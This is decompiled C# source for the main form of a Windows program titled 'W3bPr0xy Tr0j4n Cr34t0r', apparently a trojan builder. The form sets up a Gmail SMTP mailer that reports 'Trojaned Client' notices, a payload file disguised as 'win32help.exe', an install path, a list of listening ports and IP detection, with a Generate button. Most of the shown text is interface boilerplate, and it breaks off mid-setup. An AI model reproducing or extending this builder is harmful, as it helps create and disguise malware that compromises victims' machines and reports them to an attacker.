using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My.Resources;

[DesignerGenerated]
public class frmMain : Form
{
	protected class Mail
	{
		private string __Host;

		private string __UserName;

		private string __Password;

		private int __Port;

		private int __Timeout;

		public string Host
		{
			get
			{
				return __Host;
			}
			set
			{
				__Host = value;
			}
		}

		public string UserName
		{
			get
			{
				return __UserName;
			}
			set
			{
				__UserName = value;
			}
		}

		public string Password
		{
			get
			{
				return __Password;
			}
			set
			{
				__Password = value;
			}
		}

		public int Port
		{
			get
			{
				return __Port;
			}
			set
			{
				__Port = value;
			}
		}

		public int Timeout
		{
			get
			{
				return __Timeout;
			}
			set
			{
				__Timeout = value;
			}
		}

		public Mail(string sHost, string sUserName = "", string sPassword = "", int iPort = 587, int iTimeout = 60)
		{
			__Host = sHost;
			__UserName = sUserName;
			__Password = sPassword;
			__Port = iPort;
			__Timeout = iTimeout;
		}

		public bool SendMail(string sFrom, string sTO, string sSubject, string sBody, params string[] sHeaders)
		{
			MailMessage mailMessage = new MailMessage();
			MailAddress from = new MailAddress(sFrom);
			MailAddress item = new MailAddress(sTO);
			mailMessage.From = from;
			mailMessage.To.Add(item);
			mailMessage.Subject = sSubject;
			mailMessage.Body = sBody;
			checked
			{
				if (!Information.IsNothing((object)sHeaders) && Information.UBound((Array)sHeaders, 1) > 0)
				{
					int num = Information.LBound((Array)sHeaders, 1);
					int num2 = Information.UBound((Array)sHeaders, 1) - 1;
					for (int i = num; i <= num2; i++)
					{
						mailMessage.Headers.Add(sHeaders[i], sHeaders[i + 1]);
					}
				}
				SmtpClient smtpClient = new SmtpClient();
				if (!string.IsNullOrEmpty(__UserName) & !string.IsNullOrEmpty(__Password))
				{
					smtpClient.UseDefaultCredentials = false;
					smtpClient.Credentials = new NetworkCredential(__UserName, __Password);
				}
				smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
				smtpClient.Host = __Host;
				smtpClient.Port = __Port;
				smtpClient.Timeout = __Timeout * 1000;
				smtpClient.EnableSsl = true;
				smtpClient.Send(mailMessage);
				mailMessage = null;
				from = null;
				item = null;
				smtpClient = null;
				return true;
			}
		}
	}

	private IContainer components;

	[AccessedThroughProperty("grbMail")]
	private GroupBox _grbMail;

	[AccessedThroughProperty("txtHost")]
	private TextBox _txtHost;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label6")]
	private Label _Label6;

	[AccessedThroughProperty("txtSubject")]
	private TextBox _txtSubject;

	[AccessedThroughProperty("Label5")]
	private Label _Label5;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("txtFrom")]
	private TextBox _txtFrom;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("txtPassword")]
	private TextBox _txtPassword;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("txtUser")]
	private TextBox _txtUser;

	[AccessedThroughProperty("numPort")]
	private NumericUpDown _numPort;

	[AccessedThroughProperty("numTimeout")]
	private NumericUpDown _numTimeout;

	[AccessedThroughProperty("Label7")]
	private Label _Label7;

	[AccessedThroughProperty("grbSettings")]
	private GroupBox _grbSettings;

	[AccessedThroughProperty("Label13")]
	private Label _Label13;

	[AccessedThroughProperty("txtListeningPorts")]
	private TextBox _txtListeningPorts;

	[AccessedThroughProperty("Label14")]
	private Label _Label14;

	[AccessedThroughProperty("txtDetectIP")]
	private TextBox _txtDetectIP;

	[AccessedThroughProperty("Label8")]
	private Label _Label8;

	[AccessedThroughProperty("txtFileName")]
	private TextBox _txtFileName;

	[AccessedThroughProperty("cmbDir")]
	private ComboBox _cmbDir;

	[AccessedThroughProperty("Label9")]
	private Label _Label9;

	[AccessedThroughProperty("btnGenerate")]
	private GlassButton _btnGenerate;

	[AccessedThroughProperty("btnExit")]
	private GlassButton _btnExit;

	[AccessedThroughProperty("btnMailTest")]
	private GlassButton _btnMailTest;

	[AccessedThroughProperty("lblStatus")]
	private GlassButton _lblStatus;

	private const string APP_TITLE = "W3bPr0xy Tr0j4n Cr34t0r v.1.0";

	private const int WM_NCLBUTTONDOWN = 161;

	private const int HTCAPTION = 2;

	internal virtual GroupBox grbMail
	{
		[DebuggerNonUserCode]
		get
		{
			return _grbMail;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_grbMail = value;
		}
	}

	internal virtual TextBox txtHost
	{
		[DebuggerNonUserCode]
		get
		{
			return _txtHost;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = txtMAIL_TextChanged;
			if (_txtHost != null)
			{
				((Control)_txtHost).remove_TextChanged(eventHandler);
			}
			_txtHost = value;
			if (_txtHost != null)
			{
				((Control)_txtHost).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label6 = value;
		}
	}

	internal virtual TextBox txtSubject
	{
		[DebuggerNonUserCode]
		get
		{
			return _txtSubject;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = txtMAIL_TextChanged;
			if (_txtSubject != null)
			{
				((Control)_txtSubject).remove_TextChanged(eventHandler);
			}
			_txtSubject = value;
			if (_txtSubject != null)
			{
				((Control)_txtSubject).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual Label Label5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label5 = value;
		}
	}

	internal virtual Label Label4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label4 = value;
		}
	}

	internal virtual TextBox txtFrom
	{
		[DebuggerNonUserCode]
		get
		{
			return _txtFrom;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = txtMAIL_TextChanged;
			if (_txtFrom != null)
			{
				((Control)_txtFrom).remove_TextChanged(eventHandler);
			}
			_txtFrom = value;
			if (_txtFrom != null)
			{
				((Control)_txtFrom).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual TextBox txtPassword
	{
		[DebuggerNonUserCode]
		get
		{
			return _txtPassword;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txtPassword = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual TextBox txtUser
	{
		[DebuggerNonUserCode]
		get
		{
			return _txtUser;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = txtMAIL_TextChanged;
			if (_txtUser != null)
			{
				((Control)_txtUser).remove_TextChanged(eventHandler);
			}
			_txtUser = value;
			if (_txtUser != null)
			{
				((Control)_txtUser).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual NumericUpDown numPort
	{
		[DebuggerNonUserCode]
		get
		{
			return _numPort;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_numPort = value;
		}
	}

	internal virtual NumericUpDown numTimeout
	{
		[DebuggerNonUserCode]
		get
		{
			return _numTimeout;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_numTimeout = value;
		}
	}

	internal virtual Label Label7
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label7 = value;
		}
	}

	internal virtual GroupBox grbSettings
	{
		[DebuggerNonUserCode]
		get
		{
			return _grbSettings;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_grbSettings = value;
		}
	}

	internal virtual Label Label13
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label13 = value;
		}
	}

	internal virtual TextBox txtListeningPorts
	{
		[DebuggerNonUserCode]
		get
		{
			return _txtListeningPorts;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = txtListeningPorts_Leave;
			if (_txtListeningPorts != null)
			{
				((Control)_txtListeningPorts).remove_Leave(eventHandler);
			}
			_txtListeningPorts = value;
			if (_txtListeningPorts != null)
			{
				((Control)_txtListeningPorts).add_Leave(eventHandler);
			}
		}
	}

	internal virtual Label Label14
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label14 = value;
		}
	}

	internal virtual TextBox txtDetectIP
	{
		[DebuggerNonUserCode]
		get
		{
			return _txtDetectIP;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = txtDetectIP_Leave;
			if (_txtDetectIP != null)
			{
				((Control)_txtDetectIP).remove_Leave(eventHandler);
			}
			_txtDetectIP = value;
			if (_txtDetectIP != null)
			{
				((Control)_txtDetectIP).add_Leave(eventHandler);
			}
		}
	}

	internal virtual Label Label8
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label8 = value;
		}
	}

	internal virtual TextBox txtFileName
	{
		[DebuggerNonUserCode]
		get
		{
			return _txtFileName;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = txtFileName_Leave;
			if (_txtFileName != null)
			{
				((Control)_txtFileName).remove_Leave(eventHandler);
			}
			_txtFileName = value;
			if (_txtFileName != null)
			{
				((Control)_txtFileName).add_Leave(eventHandler);
			}
		}
	}

	internal virtual ComboBox cmbDir
	{
		[DebuggerNonUserCode]
		get
		{
			return _cmbDir;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_cmbDir = value;
		}
	}

	internal virtual Label Label9
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label9 = value;
		}
	}

	internal virtual GlassButton btnGenerate
	{
		[DebuggerNonUserCode]
		get
		{
			return _btnGenerate;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = btnGenerate_Click;
			if (_btnGenerate != null)
			{
				((Control)_btnGenerate).remove_Click(eventHandler);
			}
			_btnGenerate = value;
			if (_btnGenerate != null)
			{
				((Control)_btnGenerate).add_Click(eventHandler);
			}
		}
	}

	internal virtual GlassButton btnExit
	{
		[DebuggerNonUserCode]
		get
		{
			return _btnExit;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = btnExit_Click;
			if (_btnExit != null)
			{
				((Control)_btnExit).remove_Click(eventHandler);
			}
			_btnExit = value;
			if (_btnExit != null)
			{
				((Control)_btnExit).add_Click(eventHandler);
			}
		}
	}

	internal virtual GlassButton btnMailTest
	{
		[DebuggerNonUserCode]
		get
		{
			return _btnMailTest;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = btnMailTest_Click;
			if (_btnMailTest != null)
			{
				((Control)_btnMailTest).remove_Click(eventHandler);
			}
			_btnMailTest = value;
			if (_btnMailTest != null)
			{
				((Control)_btnMailTest).add_Click(eventHandler);
			}
		}
	}

	internal virtual GlassButton lblStatus
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblStatus;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblStatus = value;
		}
	}

	[DebuggerNonUserCode]
	public frmMain()
	{
		((Form)this).add_Load((EventHandler)frmMain_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_11c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_12ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_1399: Unknown result type (might be due to invalid IL or missing references)
		//IL_145c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1466: Expected O, but got Unknown
		//IL_14bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_156d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1577: Expected O, but got Unknown
		//IL_15f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_1603: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(frmMain));
		grbMail = new GroupBox();
		numTimeout = new NumericUpDown();
		Label7 = new Label();
		numPort = new NumericUpDown();
		Label6 = new Label();
		txtSubject = new TextBox();
		Label5 = new Label();
		Label4 = new Label();
		txtFrom = new TextBox();
		Label3 = new Label();
		txtPassword = new TextBox();
		Label2 = new Label();
		txtUser = new TextBox();
		Label1 = new Label();
		txtHost = new TextBox();
		grbSettings = new GroupBox();
		Label9 = new Label();
		cmbDir = new ComboBox();
		Label8 = new Label();
		txtFileName = new TextBox();
		Label13 = new Label();
		txtListeningPorts = new TextBox();
		Label14 = new Label();
		txtDetectIP = new TextBox();
		btnExit = new GlassButton();
		btnGenerate = new GlassButton();
		btnMailTest = new GlassButton();
		lblStatus = new GlassButton();
		((Control)grbMail).SuspendLayout();
		((ISupportInitialize)numTimeout).BeginInit();
		((ISupportInitialize)numPort).BeginInit();
		((Control)grbSettings).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)grbMail).get_Controls().Add((Control)(object)btnMailTest);
		((Control)grbMail).get_Controls().Add((Control)(object)numTimeout);
		((Control)grbMail).get_Controls().Add((Control)(object)Label7);
		((Control)grbMail).get_Controls().Add((Control)(object)numPort);
		((Control)grbMail).get_Controls().Add((Control)(object)Label6);
		((Control)grbMail).get_Controls().Add((Control)(object)txtSubject);
		((Control)grbMail).get_Controls().Add((Control)(object)Label5);
		((Control)grbMail).get_Controls().Add((Control)(object)Label4);
		((Control)grbMail).get_Controls().Add((Control)(object)txtFrom);
		((Control)grbMail).get_Controls().Add((Control)(object)Label3);
		((Control)grbMail).get_Controls().Add((Control)(object)txtPassword);
		((Control)grbMail).get_Controls().Add((Control)(object)Label2);
		((Control)grbMail).get_Controls().Add((Control)(object)txtUser);
		((Control)grbMail).get_Controls().Add((Control)(object)Label1);
		((Control)grbMail).get_Controls().Add((Control)(object)txtHost);
		((Control)grbMail).set_ForeColor(Color.FromArgb(0, 192, 192));
		GroupBox obj = grbMail;
		Point location = new Point(292, 3);
		((Control)obj).set_Location(location);
		((Control)grbMail).set_Name("grbMail");
		GroupBox obj2 = grbMail;
		Size size = new Size(287, 201);
		((Control)obj2).set_Size(size);
		((Control)grbMail).set_TabIndex(1);
		grbMail.set_TabStop(false);
		grbMail.set_Text("Your Mail Porperties");
		((UpDownBase)numTimeout).set_BackColor(Color.Black);
		((UpDownBase)numTimeout).set_ForeColor(Color.FromArgb(0, 192, 0));
		NumericUpDown obj3 = numTimeout;
		decimal num = new decimal(new int[4] { 10, 0, 0, 0 });
		obj3.set_Increment(num);
		NumericUpDown obj4 = numTimeout;
		location = new Point(231, 149);
		((Control)obj4).set_Location(location);
		NumericUpDown obj5 = numTimeout;
		num = new decimal(new int[4] { 120, 0, 0, 0 });
		obj5.set_Maximum(num);
		((Control)numTimeout).set_Name("numTimeout");
		NumericUpDown obj6 = numTimeout;
		size = new Size(50, 21);
		((Control)obj6).set_Size(size);
		((Control)numTimeout).set_TabIndex(13);
		NumericUpDown obj7 = numTimeout;
		num = new decimal(new int[4] { 60, 0, 0, 0 });
		obj7.set_Value(num);
		((Control)Label7).set_ForeColor(Color.FromArgb(192, 192, 255));
		Label label = Label7;
		location = new Point(160, 152);
		((Control)label).set_Location(location);
		((Control)Label7).set_Name("Label7");
		Label label2 = Label7;
		size = new Size(65, 17);
		((Control)label2).set_Size(size);
		((Control)Label7).set_TabIndex(12);
		Label7.set_Text("TimeOut:");
		Label7.set_TextAlign((ContentAlignment)64);
		((UpDownBase)numPort).set_BackColor(Color.Black);
		((UpDownBase)numPort).set_ForeColor(Color.FromArgb(0, 192, 0));
		NumericUpDown obj8 = numPort;
		location = new Point(77, 149);
		((Control)obj8).set_Location(location);
		NumericUpDown obj9 = numPort;
		num = new decimal(new int[4] { 30000, 0, 0, 0 });
		obj9.set_Maximum(num);
		NumericUpDown obj10 = numPort;
		num = new decimal(new int[4] { 1, 0, 0, 0 });
		obj10.set_Minimum(num);
		((Control)numPort).set_Name("numPort");
		NumericUpDown obj11 = numPort;
		size = new Size(50, 21);
		((Control)obj11).set_Size(size);
		((Control)numPort).set_TabIndex(11);
		NumericUpDown obj12 = numPort;
		num = new decimal(new int[4] { 587, 0, 0, 0 });
		obj12.set_Value(num);
		((Control)Label6).set_ForeColor(Color.FromArgb(192, 192, 255));
		Label label3 = Label6;
		location = new Point(6, 124);
		((Control)label3).set_Location(location);
		((Control)Label6).set_Name("Label6");
		Label label4 = Label6;
		size = new Size(65, 17);
		((Control)label4).set_Size(size);
		((Control)Label6).set_TabIndex(8);
		Label6.set_Text("Subject:");
		Label6.set_TextAlign((ContentAlignment)64);
		((TextBoxBase)txtSubject).set_BackColor(Color.Black);
		((TextBoxBase)txtSubject).set_ForeColor(Color.FromArgb(0, 192, 0));
		TextBox obj13 = txtSubject;
		location = new Point(77, 123);
		((Control)obj13).set_Location(location);
		((TextBoxBase)txtSubject).set_MaxLength(100);
		((Control)txtSubject).set_Name("txtSubject");
		TextBox obj14 = txtSubject;
		size = new Size(204, 21);
		((Control)obj14).set_Size(size);
		((Control)txtSubject).set_TabIndex(9);
		txtSubject.set_Text("Trojaned Client");
		((Control)Label5).set_ForeColor(Color.FromArgb(192, 192, 255));
		Label label5 = Label5;
		location = new Point(6, 149);
		((Control)label5).set_Location(location);
		((Control)Label5).set_Name("Label5");
		Label label6 = Label5;
		size = new Size(65, 17);
		((Control)label6).set_Size(size);
		((Control)Label5).set_TabIndex(10);
		Label5.set_Text("Port:");
		Label5.set_TextAlign((ContentAlignment)64);
		((Control)Label4).set_ForeColor(Color.FromArgb(192, 192, 255));
		Label label7 = Label4;
		location = new Point(6, 98);
		((Control)label7).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label8 = Label4;
		size = new Size(65, 17);
		((Control)label8).set_Size(size);
		((Control)Label4).set_TabIndex(6);
		Label4.set_Text("From:");
		Label4.set_TextAlign((ContentAlignment)64);
		((TextBoxBase)txtFrom).set_BackColor(Color.Black);
		((TextBoxBase)txtFrom).set_ForeColor(Color.FromArgb(0, 192, 0));
		TextBox obj15 = txtFrom;
		location = new Point(77, 97);
		((Control)obj15).set_Location(location);
		((TextBoxBase)txtFrom).set_MaxLength(100);
		((Control)txtFrom).set_Name("txtFrom");
		TextBox obj16 = txtFrom;
		size = new Size(204, 21);
		((Control)obj16).set_Size(size);
		((Control)txtFrom).set_TabIndex(7);
		txtFrom.set_Text("webpr0xy@trojan.com");
		((Control)Label3).set_ForeColor(Color.FromArgb(192, 192, 255));
		Label label9 = Label3;
		location = new Point(6, 74);
		((Control)label9).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label10 = Label3;
		size = new Size(65, 17);
		((Control)label10).set_Size(size);
		((Control)Label3).set_TabIndex(4);
		Label3.set_Text("Password:");
		Label3.set_TextAlign((ContentAlignment)64);
		((TextBoxBase)txtPassword).set_BackColor(Color.Black);
		((TextBoxBase)txtPassword).set_ForeColor(Color.FromArgb(0, 192, 0));
		TextBox obj17 = txtPassword;
		location = new Point(77, 71);
		((Control)obj17).set_Location(location);
		((TextBoxBase)txtPassword).set_MaxLength(100);
		((Control)txtPassword).set_Name("txtPassword");
		TextBox obj18 = txtPassword;
		size = new Size(204, 21);
		((Control)obj18).set_Size(size);
		((Control)txtPassword).set_TabIndex(5);
		((Control)Label2).set_ForeColor(Color.FromArgb(192, 192, 255));
		Label label11 = Label2;
		location = new Point(6, 48);
		((Control)label11).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label12 = Label2;
		size = new Size(65, 17);
		((Control)label12).set_Size(size);
		((Control)Label2).set_TabIndex(2);
		Label2.set_Text("User:");
		Label2.set_TextAlign((ContentAlignment)64);
		((TextBoxBase)txtUser).set_BackColor(Color.Black);
		((TextBoxBase)txtUser).set_ForeColor(Color.FromArgb(0, 192, 0));
		TextBox obj19 = txtUser;
		location = new Point(77, 45);
		((Control)obj19).set_Location(location);
		((TextBoxBase)txtUser).set_MaxLength(100);
		((Control)txtUser).set_Name("txtUser");
		TextBox obj20 = txtUser;
		size = new Size(204, 21);
		((Control)obj20).set_Size(size);
		((Control)txtUser).set_TabIndex(3);
		txtUser.set_Text("0x664c615368@gmail.com");
		((Control)Label1).set_ForeColor(Color.FromArgb(192, 192, 255));
		Label label13 = Label1;
		location = new Point(6, 20);
		((Control)label13).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label14 = Label1;
		size = new Size(65, 17);
		((Control)label14).set_Size(size);
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("Host:");
		Label1.set_TextAlign((ContentAlignment)64);
		((TextBoxBase)txtHost).set_BackColor(Color.Black);
		((TextBoxBase)txtHost).set_ForeColor(Color.FromArgb(0, 192, 0));
		TextBox obj21 = txtHost;
		location = new Point(77, 19);
		((Control)obj21).set_Location(location);
		((TextBoxBase)txtHost).set_MaxLength(100);
		((Control)txtHost).set_Name("txtHost");
		TextBox obj22 = txtHost;
		size = new Size(204, 21);
		((Control)obj22).set_Size(size);
		((Control)txtHost).set_TabIndex(1);
		txtHost.set_Text("smtp.gmail.com");
		((Control)grbSettings).get_Controls().Add((Control)(object)Label9);
		((Control)grbSettings).get_Controls().Add((Control)(object)cmbDir);
		((Control)grbSettings).get_Controls().Add((Control)(object)Label8);
		((Control)grbSettings).get_Controls().Add((Control)(object)txtFileName);
		((Control)grbSettings).get_Controls().Add((Control)(object)Label13);
		((Control)grbSettings).get_Controls().Add((Control)(object)txtListeningPorts);
		((Control)grbSettings).get_Controls().Add((Control)(object)Label14);
		((Control)grbSettings).get_Controls().Add((Control)(object)txtDetectIP);
		((Control)grbSettings).set_ForeColor(Color.FromArgb(0, 192, 192));
		GroupBox obj23 = grbSettings;
		location = new Point(292, 210);
		((Control)obj23).set_Location(location);
		((Control)grbSettings).set_Name("grbSettings");
		GroupBox obj24 = grbSettings;
		size = new Size(287, 151);
		((Control)obj24).set_Size(size);
		((Control)grbSettings).set_TabIndex(2);
		grbSettings.set_TabStop(false);
		grbSettings.set_Text("Settings");
		((Control)Label9).set_ForeColor(Color.FromArgb(192, 192, 255));
		Label label15 = Label9;
		location = new Point(6, 103);
		((Control)label15).set_Location(location);
		((Control)Label9).set_Name("Label9");
		Label label16 = Label9;
		size = new Size(113, 17);
		((Control)label16).set_Size(size);
		((Control)Label9).set_TabIndex(5);
		Label9.set_Text("Install Path");
		Label9.set_TextAlign((ContentAlignment)16);
		cmbDir.set_BackColor(Color.Black);
		cmbDir.set_FlatStyle((FlatStyle)1);
		cmbDir.set_ForeColor(Color.FromArgb(0, 192, 0));
		((ListControl)cmbDir).set_FormattingEnabled(true);
		ComboBox obj25 = cmbDir;
		location = new Point(7, 124);
		((Control)obj25).set_Location(location);
		((Control)cmbDir).set_Name("cmbDir");
		ComboBox obj26 = cmbDir;
		size = new Size(133, 21);
		((Control)obj26).set_Size(size);
		((Control)cmbDir).set_TabIndex(6);
		((Control)Label8).set_ForeColor(Color.FromArgb(192, 192, 255));
		Label label17 = Label8;
		location = new Point(168, 103);
		((Control)label17).set_Location(location);
		((Control)Label8).set_Name("Label8");
		Label label18 = Label8;
		size = new Size(113, 17);
		((Control)label18).set_Size(size);
		((Control)Label8).set_TabIndex(7);
		Label8.set_Text("File Name");
		Label8.set_TextAlign((ContentAlignment)64);
		((TextBoxBase)txtFileName).set_BackColor(Color.Black);
		((TextBoxBase)txtFileName).set_ForeColor(Color.FromArgb(0, 192, 0));
		TextBox obj27 = txtFileName;
		location = new Point(147, 123);
		((Control)obj27).set_Location(location);
		((TextBoxBase)txtFileName).set_MaxLength(100);
		((Control)txtFileName).set_Name("txtFileName");
		TextBox obj28 = txtFileName;
		size = new Size(134, 21);
		((Control)obj28).set_Size(size);
		((Control)txtFileName).set_TabIndex(0);
		txtFileName.set_Text("win32help.exe");
		((Control)Label13).set_ForeColor(Color.FromArgb(192, 192, 255));
		Label label19 = Label13;
		location = new Point(6, 59);
		((Control)label19).set_Location(location);
		((Control)Label13).set_Name("Label13");
		Label label20 = Label13;
		size = new Size(275, 17);
		((Control)label20).set_Size(size);
		((Control)Label13).set_TabIndex(3);
		Label13.set_Text("Listening Ports [Separate ports with a simicolon (;)]");
		Label13.set_TextAlign((ContentAlignment)64);
		((TextBoxBase)txtListeningPorts).set_BackColor(Color.Black);
		((TextBoxBase)txtListeningPorts).set_ForeColor(Color.FromArgb(0, 192, 0));
		TextBox obj29 = txtListeningPorts;
		location = new Point(6, 79);
		((Control)obj29).set_Location(location);
		((TextBoxBase)txtListeningPorts).set_MaxLength(100);
		((Control)txtListeningPorts).set_Name("txtListeningPorts");
		TextBox obj30 = txtListeningPorts;
		size = new Size(275, 21);
		((Control)obj30).set_Size(size);
		((Control)txtListeningPorts).set_TabIndex(4);
		txtListeningPorts.set_Text("10;21;22;80;81;135;136;411;412;666;1433;1434;2012;2013;3306;3307;3308;3309");
		((Control)Label14).set_ForeColor(Color.FromArgb(192, 192, 255));
		Label label21 = Label14;
		location = new Point(6, 16);
		((Control)label21).set_Location(location);
		((Control)Label14).set_Name("Label14");
		Label label22 = Label14;
		size = new Size(275, 17);
		((Control)label22).set_Size(size);
		((Control)Label14).set_TabIndex(1);
		Label14.set_Text("Detect IP Address");
